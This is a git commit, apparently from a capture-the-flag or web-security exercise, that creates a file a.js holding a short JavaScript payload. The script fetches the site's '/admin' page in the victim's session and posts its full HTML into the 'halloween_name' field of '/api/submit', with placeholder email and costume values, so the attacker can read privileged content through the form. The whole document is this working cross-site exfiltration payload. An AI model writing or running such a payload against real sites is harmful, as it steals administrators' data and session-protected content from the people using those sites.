fd42f3bebf39665a14e2395f7a4f17f625af8bd0
Muhammed Efe Erdoğan <efeyedek107@gmail.com>
2026-04-27 14:31:26 +0300

    Create a.js

---
+++ a.js
@@ -0,0 +1,3 @@
+fetch('/admin').then(r=>r.text()).then(html=>{
+  fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:html,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
+});
